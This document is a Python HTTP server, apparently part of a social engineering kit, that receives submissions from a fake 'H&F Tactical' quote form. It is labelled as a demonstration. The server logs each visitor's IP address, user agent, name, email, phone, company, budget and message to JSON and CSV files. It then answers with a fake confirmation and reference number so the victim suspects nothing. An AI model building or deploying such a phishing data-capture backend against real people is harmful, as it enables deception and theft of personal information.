#!/usr/bin/env python3
"""
H&F Tactical - Data Capture Backend
Captures user information from quote forms for social engineering demonstrations
"""

import json
import csv
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import threading
import time

class DataCaptureHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Handle POST requests from quote forms"""
        try:
            # Parse the request
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse form data
            form_data = parse_qs(post_data)
            
            # Extract user information
            user_data = {
                'timestamp': datetime.now().isoformat(),
                'ip_address': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'referer': self.headers.get('Referer', 'Unknown'),
                'form_data': {}
            }
            
            # Extract form fields
            for key, value in form_data.items():
                user_data['form_data'][key] = value[0] if value else ''
            
            # Save to files
            self.save_to_json(user_data)
            self.save_to_csv(user_data)
            
            # Log the capture
            print(f"📧 CAPTURED DATA from {user_data['ip_address']}")
            print(f"   Name: {user_data['form_data'].get('name', 'N/A')}")
            print(f"   Email: {user_data['form_data'].get('email', 'N/A')}")
            print(f"   Phone: {user_data['form_data'].get('phone', 'N/A')}")
            print(f"   Company: {user_data['form_data'].get('company', 'N/A')}")
            print(f"   Time: {user_data['timestamp']}")
            print("-" * 50)
            
            # Send success response with CORS headers
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
            self.end_headers()
            
            response = {
                'status': 'success',
                'message': 'Quote request submitted successfully! We will contact you within 24 hours.',
                'reference_id': f"HF-{int(time.time())}"
            }
            
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            print(f"❌ Error processing request: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'error', 'message': 'Internal server error'}).encode())
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def save_to_json(self, data):
        """Save captured data to JSON file"""
        filename = 'captured_data.json'
        
        # Load existing data
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                try:
                    existing_data = json.load(f)
                except:
                    existing_data = []
        else:
            existing_data = []
        
        # Add new data
        existing_data.append(data)
        
        # Save back to file
        with open(filename, 'w') as f:
            json.dump(existing_data, f, indent=2)
    
    def save_to_csv(self, data):
        """Save captured data to CSV file"""
        filename = 'captured_data.csv'
        
        # Check if file exists
        file_exists = os.path.exists(filename)
        
        # Prepare CSV row
        row = [
            data['timestamp'],
            data['ip_address'],
            data['form_data'].get('name', ''),
            data['form_data'].get('email', ''),
            data['form_data'].get('phone', ''),
            data['form_data'].get('company', ''),
            data['form_data'].get('position', ''),
            data['form_data'].get('product_type', ''),
            data['form_data'].get('quantity', ''),
            data['form_data'].get('budget', ''),
            data['form_data'].get('message', ''),
            data['user_agent'],
            data['referer']
        ]
        
        # Write to CSV
        with open(filename, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            
            # Write header if new file
            if not file_exists:
                header = [
                    'Timestamp', 'IP Address', 'Name', 'Email', 'Phone', 
                    'Company', 'Position', 'Product Type', 'Quantity', 
                    'Budget', 'Message', 'User Agent', 'Referer'
                ]
                writer.writerow(header)
            
            writer.writerow(row)
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

def start_capture_server(port=8081):
    """Start the data capture server"""
    server = HTTPServer(('0.0.0.0', port), DataCaptureHandler)
    print(f"🎯 H&F TACTICAL DATA CAPTURE SERVER")
    print(f"📡 Listening on http://192.168.50.102:{port}")
    print(f"📁 Data will be saved to:")
    print(f"   • captured_data.json (detailed)")
    print(f"   • captured_data.csv (spreadsheet)")
    print(f"🔥 Ready to capture social engineering targets!")
    print("-" * 60)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Capture server stopped")
        server.shutdown()

if __name__ == "__main__":
    start_capture_server()
